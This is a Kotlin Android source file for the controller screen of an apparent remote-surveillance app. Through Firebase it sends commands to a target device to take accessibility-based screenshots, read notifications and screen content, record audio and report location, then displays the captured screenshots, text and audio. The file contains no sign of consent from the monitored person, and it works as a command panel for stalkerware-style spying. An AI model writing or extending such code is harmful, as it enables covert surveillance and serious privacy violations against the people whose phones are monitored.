package com.jonas.x24

import android.graphics.BitmapFactory
import android.media.MediaPlayer
import android.os.Bundle
import android.util.Base64
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.io.File
import java.io.FileOutputStream

class MonitorActivity : AppCompatActivity() {

    private lateinit var sessionKey: String
    private lateinit var database: DatabaseReference
    private lateinit var tvResults: TextView
    private lateinit var ivScreenshot: ImageView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_monitor)

        sessionKey = intent.getStringExtra("SESSION_KEY") ?: return finish()
        database = FirebaseDatabase.getInstance().reference.child("sessions").child(sessionKey)

        tvResults = findViewById(R.id.tvResults)
        ivScreenshot = findViewById(R.id.ivScreenshot)



        findViewById<Button>(R.id.btnScreenshotA11y).setOnClickListener {
            sendCommand("SCREENSHOT_A11Y")
        }

        findViewById<Button>(R.id.btnReadNotifications).setOnClickListener {
            sendCommand("READ_NOTIFICATIONS")
        }

        findViewById<Button>(R.id.btnReadScreen).setOnClickListener {
            sendCommand("READ_SCREEN")
        }

        findViewById<Button>(R.id.btnStartRecord).setOnClickListener {
            sendCommand("START_RECORD_AUDIO")
        }

        findViewById<Button>(R.id.btnStopRecord).setOnClickListener {
            sendCommand("STOP_RECORD_AUDIO")
        }

        findViewById<Button>(R.id.btnGetLocation).setOnClickListener {
            sendCommand("GET_LOCATION")
        }

        findViewById<Button>(R.id.btnLogout).setOnClickListener {
            logout()
        }

        listenForResults()
    }

    private fun logout() {
        val prefs = getSharedPreferences("x24_prefs", android.content.Context.MODE_PRIVATE)
        prefs.edit().clear().apply()
        val intent = android.content.Intent(this, MainActivity::class.java)
        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK)
        startActivity(intent)
        finish()
    }

    private fun sendCommand(command: String) {
        val commandRef = database.child("commands").push()
        val data = mapOf(
            "command" to command,
            "timestamp" to System.currentTimeMillis()
        )
        commandRef.setValue(data).addOnSuccessListener {
            Toast.makeText(this, "Command sent: $command", Toast.LENGTH_SHORT).show()
        }
    }

    private fun listenForResults() {
        database.child("results").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                // Get the latest result
                val children = snapshot.children.toList()
                if (children.isNotEmpty()) {
                    val latest = children.last()
                    val type = latest.child("type").value as? String
                    val data = latest.child("data").value as? String

                    if (type != null && data != null) {
                        handleResult(type, data)
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Toast.makeText(this@MonitorActivity, "Error listening to results", Toast.LENGTH_SHORT).show()
            }
        })
    }

    private fun handleResult(type: String, data: String) {
        when (type) {
            "TEXT" -> {
                tvResults.text = "Notification Result:\n$data"
                ivScreenshot.setImageDrawable(null)
            }
            "IMAGE" -> {
                try {
                    val decodedBytes = Base64.decode(data, Base64.DEFAULT)
                    val bitmap = BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.size)
                    ivScreenshot.setImageBitmap(bitmap)
                    tvResults.text = "Screenshot received."
                } catch (e: Exception) {
                    tvResults.text = "Failed to decode image."
                }
            }
            "AUDIO" -> {
                tvResults.text = "Audio received, playing..."
                ivScreenshot.setImageDrawable(null)
                playAudioFromBase64(data)
            }
            "ERROR" -> {
                tvResults.text = "Error from device: $data"
                ivScreenshot.setImageDrawable(null)
            }
        }
    }

    private fun playAudioFromBase64(base64Audio: String) {
        try {
            val audioBytes = Base64.decode(base64Audio, Base64.DEFAULT)
            val tempFile = File.createTempFile("received_audio", ".3gp", cacheDir)
            val fos = FileOutputStream(tempFile)
            fos.write(audioBytes)
            fos.close()

            val mediaPlayer = MediaPlayer()
            mediaPlayer.setDataSource(tempFile.absolutePath)
            mediaPlayer.prepare()
            mediaPlayer.start()

            mediaPlayer.setOnCompletionListener {
                it.release()
                tempFile.delete()
            }
        } catch (e: Exception) {
            tvResults.text = "Error playing audio: ${e.message}"
        }
    }
}
